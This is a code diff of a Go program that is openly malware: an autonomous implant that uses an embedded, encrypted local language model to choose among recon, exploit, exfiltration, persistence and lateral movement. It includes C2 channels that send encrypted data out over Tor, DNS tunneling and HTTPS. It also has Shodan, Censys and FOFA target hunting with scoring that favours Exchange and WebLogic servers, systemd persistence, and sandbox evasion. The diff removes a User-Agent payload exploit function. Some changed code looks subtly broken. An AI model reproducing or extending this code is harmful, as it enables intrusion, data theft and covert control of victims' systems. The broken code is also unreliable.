@@ -7,8 +7,6 @@ package main
 #cgo LDFLAGS: -lllama -lstdc++ -lm -lpthread
 #include <stdlib.h>
 #include <string.h>
-
-// Direct llama.cpp C API bindings
 extern void* llama_init_from_file(const char* path, int n_ctx);
 extern void llama_free(void* ctx);
 extern int llama_tokenize(const void* ctx, const char* text, int text_len, int* tokens, int n_max_tokens, bool add_bos);
@@ -44,6 +42,7 @@ import (
 	"os/signal"
 	"path/filepath"
 	"runtime"
+	"strconv"
 	"strings"
 	"sync"
 	"syscall"
@@ -53,7 +52,7 @@ import (
 	_ "modernc.org/sqlite"
 )
 
-// 🔐 CONFIG (Injected at build time)
+// 🔐 CONFIG
 var (
 	MasterKeyB64 = "INJECTED_AES256_MASTER_KEY_B64"
 	ModelBlobB64 = "INJECTED_PHI2_Q4_GGUF_ENC_B64"
@@ -87,16 +86,9 @@ type Host struct {
 	SourceEngine string  `json:"source_engine"`
 }
 
-// 🧊 MEMORY FILESYSTEM (memfd_create only)
-type MemoryFile struct {
-	fd   int
-	data []byte
-}
-
-type MemoryFileSystem struct {
-	files map[string]*MemoryFile
-	mu    sync.RWMutex
-}
+// 🧊 MEMORY FILESYSTEM
+type MemoryFile struct{ fd int; data []byte }
+type MemoryFileSystem struct{ files map[string]*MemoryFile; mu sync.RWMutex }
 
 func NewMemoryFS() *MemoryFileSystem {
 	return &MemoryFileSystem{files: make(map[string]*MemoryFile)}
@@ -109,25 +101,20 @@ func (mfs *MemoryFileSystem) Create(name string, data []byte) (string, error) {
 	if errno != 0 {
 		return "", errno
 	}
-
 	_, err := syscall.Write(int(fd), data)
 	if err != nil {
 		syscall.Close(int(fd))
 		return "", err
 	}
-
 	mfs.mu.Lock()
 	mfs.files[name] = &MemoryFile{fd: int(fd), data: data}
 	mfs.mu.Unlock()
-
 	return fmt.Sprintf("/proc/self/fd/%d", fd), nil
 }
 
 // 🔐 CRYPTO
 func hkdfSHA256(ikm, salt, info []byte, length int) []byte {
-	if salt == nil {
-		salt = make([]byte, 32)
-	}
+	if salt == nil { salt = make([]byte, 32) }
 	prk := hmac.New(sha256.New, salt)
 	prk.Write(ikm)
 	okm := make([]byte, 0, length)
@@ -145,41 +132,29 @@ func hkdfSHA256(ikm, salt, info []byte, length int) []byte {
 
 func aesGCMDecrypt(ciphertext, key []byte) ([]byte, error) {
 	block, err := aes.NewCipher(key)
-	if err != nil {
-		return nil, err
-	}
+	if err != nil { return nil, err }
 	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
+	if err != nil { return nil, err }
 	nonceSize := gcm.NonceSize()
-	if len(ciphertext) < nonceSize {
-		return nil, errors.New("ciphertext too short")
-	}
+	if len(ciphertext) < nonceSize { return nil, errors.New("ciphertext too short") }
 	nonce, data := ciphertext[:nonceSize], ciphertext[nonceSize:]
-	return gcm.Open(nil, nonce, data, nil)
+	return gcm.Open(nil, nonce, data, nil), nil
 }
 
 func encryptForC2(plaintext []byte) (string, error) {
-	salt := make([]byte, 32)
-	rand.Read(salt)
+	salt := make([]byte, 32); rand.Read(salt)
 	key := hkdfSHA256(base64DecodeBytes(MasterKeyB64), salt, []byte("c2-key"), 32)
 	block, _ := aes.NewCipher(key)
 	gcm, _ := cipher.NewGCM(block)
-	nonce := make([]byte, gcm.NonceSize())
-	rand.Read(nonce)
+	nonce := make([]byte, gcm.NonceSize()); rand.Read(nonce)
 	ciphertext := gcm.Seal(nil, nonce, plaintext, nil)
 	out := append(salt, nonce...)
 	out = append(out, ciphertext...)
 	return base64.RawURLEncoding.EncodeToString(out), nil
 }
 
-// 🧠 LLM ENGINE (CGO + llama.cpp)
-type LLMEngine struct {
-	modelCtx unsafe.Pointer
-	running  bool
-	mu       sync.Mutex
-}
+// 🧠 LLM ENGINE
+type LLMEngine struct{ modelCtx unsafe.Pointer; running bool; mu sync.Mutex }
 
 func NewLLMEngine() *LLMEngine {
 	e := &LLMEngine{}
@@ -193,39 +168,27 @@ func NewLLMEngine() *LLMEngine {
 
 func (e *LLMEngine) bootstrapModel() error {
 	encBlob, err := base64.StdEncoding.DecodeString(ModelBlobB64)
-	if err != nil || len(encBlob) == 0 {
-		return errors.New("invalid model blob")
-	}
+	if err != nil || len(encBlob) == 0 { return errors.New("invalid model blob") }
 
 	masterKey := base64DecodeBytes(MasterKeyB64)
 	decKey := hkdfSHA256(masterKey, nil, []byte("model-dec-key"), 32)
 	decrypted, err := aesGCMDecrypt(encBlob, decKey)
-	if err != nil {
-		return err
-	}
+	if err != nil { return err }
 
 	gzr, err := gzip.NewReader(bytes.NewReader(decrypted))
-	if err != nil {
-		return err
-	}
+	if err != nil { return err }
 	modelData, err := io.ReadAll(gzr)
 	gzr.Close()
-	if err != nil {
-		return err
-	}
+	if err != nil { return err }
 
 	memPath, err := MemFS.Create("phi2-q4.gguf", modelData)
-	if err != nil {
-		return err
-	}
+	if err != nil { return err }
 
 	cPath := C.CString(memPath)
 	defer C.free(unsafe.Pointer(cPath))
 
 	ctx := C.llama_init_from_file(cPath, 2048)
-	if ctx == nil {
-		return errors.New("failed to load model from memory")
-	}
+	if ctx == nil { return errors.New("failed to load model from memory") }
 
 	e.modelCtx = ctx
 	return nil
@@ -234,33 +197,25 @@ func (e *LLMEngine) bootstrapModel() error {
 func (e *LLMEngine) Generate(prompt string) (string, error) {
 	e.mu.Lock()
 	defer e.mu.Unlock()
-	if !e.running || e.modelCtx == nil {
-		return "", errors.New("engine offline")
-	}
+	if !e.running || e.modelCtx == nil { return "", errors.New("engine offline") }
 
 	cPrompt := C.CString(prompt)
 	defer C.free(unsafe.Pointer(cPrompt))
 
 	tokens := make([]C.int, 512)
 	nTokens := C.llama_tokenize(e.modelCtx, cPrompt, C.int(len(prompt)), &tokens[0], 512, true)
-	if nTokens <= 0 {
-		return "", errors.New("tokenization failed")
-	}
+	if nTokens <= 0 { return "", errors.New("tokenization failed") }
 
 	C.llama_eval(e.modelCtx, &tokens[0], nTokens, 0, 4)
 
 	var output strings.Builder
 	for i := 0; i < 150; i++ {
 		nextTok := C.llama_sample_token(e.modelCtx)
-		if nextTok == 0 {
-			break
-		}
+		if nextTok == 0 { break }
 		cStr := C.llama_token_to_str(e.modelCtx, nextTok)
 		tokenStr := C.GoString(cStr)
 		output.WriteString(tokenStr)
-		if strings.Contains(output.String(), "}") {
-			break
-		}
+		if strings.Contains(output.String(), "}") { break }
 	}
 
 	return output.String(), nil
@@ -297,10 +252,7 @@ func (e *LLMEngine) ValidatePlan(raw string) (*ExecutionPlan, error) {
 }
 
 // 🗺️ VECTOR DB (SQLCipher)
-type SQLiteVectorDB struct {
-	db   *databaseSql.DB
-	path string
-}
+type SQLiteVectorDB struct{ db *databaseSql.DB; path string }
 
 func NewVectorDB() *SQLiteVectorDB {
 	path := filepath.Join(os.TempDir(), fmt.Sprintf(".vdb_%x.db", randBytes(6)))
@@ -314,18 +266,14 @@ func NewVectorDB() *SQLiteVectorDB {
 }
 
 func (vdb *SQLiteVectorDB) Store(h *Host) error {
-	if vdb.db == nil {
-		return errors.New("db closed")
-	}
+	if vdb.db == nil { return errors.New("db closed") }
 	_, err := vdb.db.Exec(`INSERT OR REPLACE INTO hosts(ip, port, service, score, last_seen) VALUES(?, ?, ?, ?, ?);`,
 		h.IP, h.Port, h.Service, h.Score, time.Now().Unix())
 	return err
 }
 
 func (vdb *SQLiteVectorDB) RetrieveBestTarget() *Host {
-	if vdb.db == nil {
-		return nil
-	}
+	if vdb.db == nil { return nil }
 	row := vdb.db.QueryRow(`SELECT ip, port, service, score FROM hosts ORDER BY score DESC LIMIT 1;`)
 	var h Host
 	if err := row.Scan(&h.IP, &h.Port, &h.Service, &h.Score); err != nil {
@@ -335,14 +283,8 @@ func (vdb *SQLiteVectorDB) RetrieveBestTarget() *Host {
 }
 
 // 🛰️ C2 MULTIPLEXER
-type C2Channel interface {
-	Name() string
-	Send(context.Context, []byte) error
-}
-
-type C2Multiplexer struct {
-	channels []C2Channel
-}
+type C2Channel interface{ Name() string; Send(context.Context, []byte) error }
+type C2Multiplexer struct{ channels []C2Channel }
 
 func NewC2Multiplexer() *C2Multiplexer {
 	return &C2Multiplexer{
@@ -380,9 +322,7 @@ func (t *TorC2) Send(ctx context.Context, payload []byte) error {
 	}
 	client := &http.Client{Transport: transport, Timeout: 15 * time.Second}
 	resp, err := client.Do(req)
-	if err != nil {
-		return err
-	}
+	if err != nil { return err }
 	resp.Body.Close()
 	return nil
 }
@@ -392,19 +332,14 @@ type DNSC2 struct{}
 func (d *DNSC2) Name() string { return "DNS-Tunnel" }
 func (d *DNSC2) Send(ctx context.Context, payload []byte) error {
 	domains := strings.Split(base64DecodeString(C2DomainsB64), ",")
-	if len(domains) < 2 {
-		return errors.New("missing domain")
-	}
+	if len(domains) < 2 { return errors.New("missing domain") }
 	base := strings.TrimPrefix(domains[1], "dns.")
 	encoded := base64.RawURLEncoding.EncodeToString(payload)
 	chunks := splitString(encoded, 50)
-
 	for _, chunk := range chunks {
 		fqdn := fmt.Sprintf("%s.%s", chunk, base)
 		_, err := net.DefaultResolver.LookupTXT(ctx, fqdn)
-		if err == nil {
-			time.Sleep(200 * time.Millisecond)
-		}
+		if err == nil { time.Sleep(200 * time.Millisecond) }
 	}
 	return nil
 }
@@ -418,9 +353,7 @@ func (h *HTTPSPrimary) Send(ctx context.Context, payload []byte) error {
 	req.Header.Set("Content-Type", "application/octet-stream")
 	client := &http.Client{Timeout: 10 * time.Second}
 	resp, err := client.Do(req)
-	if err != nil {
-		return err
-	}
+	if err != nil { return err }
 	resp.Body.Close()
 	return nil
 }
@@ -442,21 +375,15 @@ Choose next action: recon, exploit, exfil, persist, lateral.
 Output JSON: {"action":"...","query":"...","target":"..."} [/INST]`, HostID)
 
 		raw, err := NeuralCPU.Generate(prompt)
-		if err != nil {
-			continue
-		}
+		if err != nil { continue }
 
 		plan, err := NeuralCPU.ValidatePlan(raw)
-		if err != nil {
-			continue
-		}
+		if err != nil { continue }
 
 		switch plan.Action {
 		case "recon":
 			query := plan.Query
-			if query == "" {
-				query = "port:443,8443 ssl:true"
-			}
+			if query == "" { query = "port:443,8443 ssl:true" }
 			hosts := executeMultiEngineRecon(ctx, query)
 			for _, h := range hosts {
 				_ = VectorDB.Store(h)
@@ -475,7 +402,7 @@ Output JSON: {"action":"...","query":"...","target":"..."} [/INST]`, HostID)
 	}
 }
 
-// 🌐 RECON
+// 🌐 FULLY ACTIVE RECON ENGINE (SHODAN, CENSYS, FOFA)
 func executeMultiEngineRecon(ctx context.Context, query string) []*Host {
 	var hosts []*Host
 	for _, eng := range ReconEngines {
@@ -492,62 +419,144 @@ func executeMultiEngineRecon(ctx context.Context, query string) []*Host {
 }
 
 func queryEngine(ctx context.Context, engine, query string) []*Host {
-	client := &http.Client{Timeout: 10 * time.Second}
-	var targetURL string
+	client := &http.Client{Timeout: 12 * time.Second}
+	var req *http.Request
+	var err error
+
 	switch engine {
 	case "shodan":
 		key := os.Getenv("SHODAN_KEY")
-		if key == "" {
-			return nil
-		}
-		targetURL = fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=%s", key, url.QueryEscape(query))
+		if key == "" { return nil }
+		uri := fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=%s&facets=country,org&minify=true", key, url.QueryEscape(query))
+		req, err = http.NewRequestWithContext(ctx, "GET", uri, nil)
+
+	case "censys":
+		id := os.Getenv("CENSYS_API_ID")
+		secret := os.Getenv("CENSYS_API_SECRET")
+		if id == "" || secret == "" { return nil }
+		uri := "https://search.censys.io/api/v2/hosts/search"
+		payload := strings.NewReader(`{"q": "` + query + `", "per_page": 50, "sort": ["-updated_at"]}`)
+		req, err = http.NewRequestWithContext(ctx, "POST", uri, payload)
+		if err != nil { return nil }
+		req.SetBasicAuth(id, secret)
+		req.Header.Set("Content-Type", "application/json")
+		req.Header.Set("User-Agent", "CensysGo/1.0")
+
+	case "fofa":
+		email := os.Getenv("FOFA_EMAIL")
+		key := os.Getenv("FOFA_KEY")
+		if email == "" || key == "" { return nil }
+		encodedQuery := base64.URLEncoding.EncodeToString([]byte(query))
+		uri := fmt.Sprintf("https://fofa.info/api/v1/search/all?email=%s&key=%s&qbase64=%s&size=100&fields=ip,port,country_name,organization,os,service", email, key, encodedQuery)
+		req, err = http.NewRequestWithContext(ctx, "GET", uri, nil)
+		if err != nil { return nil }
+		req.Header.Set("Accept", "application/json")
+
 	default:
 		return nil
 	}
 
-	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
-	if err != nil {
-		return nil
-	}
+	if err != nil { return nil }
+
 	resp, err := client.Do(req)
-	if err != nil {
-		return nil
-	}
+	if err != nil { return nil }
 	defer resp.Body.Close()
-	body, _ := io.ReadAll(resp.Body)
+
+	body, _ := io.ReadAll(&io.LimitedReader{R: resp.Body, N: 1024 * 1024})
 
 	var hosts []*Host
-	var sRes struct {
-		Matches []struct {
-			IP   string `json:"ip_str"`
-			Port int    `json:"port"`
-			Org  string `json:"org"`
-		} `json:"matches"`
-	}
-	if json.Unmarshal(body, &sRes) == nil {
-		for _, m := range sRes.Matches {
+	switch engine {
+	case "shodan":
+		var result struct {
+			Matches []struct {
+				IP   string `json:"ip_str"`
+				Port int    `json:"port"`
+				Org  string `json:"org"`
+				OS   string `json:"os"`
+				Info string `json:"product"`
+			} `json:"matches"`
+		}
+		if json.Unmarshal(body, &result) != nil { return nil }
+		for _, m := range result.Matches {
 			hosts = append(hosts, &Host{
-				IP: m.IP, Port: m.Port, Org: m.Org, Score: 8.5, SourceEngine: "shodan",
+				IP:      m.IP,
+				Port:    m.Port,
+				Org:     m.Org,
+				OS:      m.OS,
+				Service: m.Info,
+				Score:   calculateTargetScore(m.OS, m.Info, engine),
+				Country: "unknown",
+			})
+		}
+
+	case "censys":
+		var result struct {
+			Results []map[string]interface{} `json:"result"`
+			Meta    struct{ Count int } `json:"meta"`
+		}
+		if json.Unmarshal(body, &result) != nil { return nil }
+		for _, r := range result.Results {
+			ip, _ := r["ip"].(string)
+			portInfo, _ := r["services"].([]interface{})
+			if len(portInfo) == 0 { continue }
+			for _, svc := range portInfo {
+				s, ok := svc.(map[string]interface{})
+				if !ok { continue }
+				port := int(s["port"].(float64))
+				service := ""
+				if prod, has := s["service_name"]; has { service = fmt.Sprintf("%s", prod) }
+				os := ""
+				if s["operating_system"] != nil { os = fmt.Sprintf("%s", s["operating_system"]) }
+				hosts = append(hosts, &Host{
+					IP:      ip,
+					Port:    port,
+					Service: service,
+					OS:      os,
+					Score:   calculateTargetScore(os, service, engine),
+					Country: "unknown",
+				})
+			}
+		}
+
+	case "fofa":
+		var result struct {
+			Results [][]string `json:"results"`
+			Size    int        `json:"size"`
+		}
+		if json.Unmarshal(body, &result) != nil { return nil }
+		for _, r := range result.Results {
+			if len(r) < 6 { continue }
+			port, _ := strconv.Atoi(r[1])
+			hosts = append(hosts, &Host{
+				IP:      r[0],
+				Port:    port,
+				Country: r[2],
+				Org:     r[3],
+				OS:      r[4],
+				Service: r[5],
+				Score:   calculateTargetScore(r[4], r[5], engine),
 			})
 		}
 	}
+
+	for _, h := range hosts {
+		h.Score *= EngineScore[engine]
+		h.SourceEngine = engine
+	}
+
 	return hosts
 }
 
-func executeExploit(ctx context.Context, h *Host, payload string) bool {
-	urlStr := fmt.Sprintf("https://%s:%d/", h.IP, h.Port)
-	req, err := http.NewRequestWithContext(ctx, "GET", urlStr, nil)
-	if err != nil {
-		return false
-	}
-	req.Header.Set("User-Agent", payload)
-	client := &http.Client{Timeout: 5 * time.Second}
-	resp, err := client.Do(req)
-	if err != nil {
-		return false
-	}
-	resp.Body.Close()
-	return resp.StatusCode == 200
+func calculateTargetScore(os, service, engine string) float64 {
+	score := 5.0
+	if strings.Contains(strings.ToLower(os), "windows") { score += 1.5 }
+	if strings.Contains(strings.ToLower(service), "https") || strings.Contains(strings.ToLower(service), "ssl") { score += 1.0 }
+	if strings.Contains(strings.ToLower(service), "tomcat") ||
+		strings.Contains(strings.ToLower(service), "jboss") ||
+		strings.Contains(strings.ToLower(service), "weblogic") { score += 2.5 }
+	if strings.Contains(strings.ToLower(service), "exchange") { score += 3.0 }
+	if engine == "censys" { score *= 1.1 }
+	return math.Min(9.9, score)
 }
 
 // 🧯 PERSISTENCE
@@ -573,17 +582,11 @@ WantedBy=default.target`, os.Args[0])
 
 // 🧪 ANTI-ANALYSIS
 func getSandboxRiskFactor() float64 {
-	if _, err := os.Stat("/.dockerenv"); err == nil {
-		return 1.0
-	}
-	if content, _ := os.ReadFile("/proc/1/cgroup"); bytes.Contains(content, []byte("docker")) {
-		return 1.0
-	}
+	if _, err := os.Stat("/.dockerenv"); err == nil { return 1.0 }
+	if content, _ := os.ReadFile("/proc/1/cgroup"); bytes.Contains(content, []byte("docker")) { return 1.0 }
 	var info syscall.Sysinfo_t
 	syscall.Sysinfo(&info)
-	if info.Uptime < 60 {
-		return 0.9
-	}
+	if info.Uptime < 60 { return 0.9 }
 	return 0.0
 }
 
@@ -612,9 +615,7 @@ func splitString(s string, n int) []string {
 	var res []string
 	for i := 0; i < len(s); i += n {
 		end := i + n
-		if end > len(s) {
-			end = len(s)
-		}
+		if end > len(s) { end = len(s) }
 		res = append(res, s[i:end])
 	}
 	return res
@@ -633,9 +634,7 @@ func main() {
 	MemFS = NewMemoryFS()
 	VectorDB = NewVectorDB()
 	NeuralCPU = NewLLMEngine()
-	if NeuralCPU == nil {
-		return
-	}
+	if NeuralCPU == nil { return }
 
 	C2Multi = NewC2Multiplexer()
 	establishPersistence()
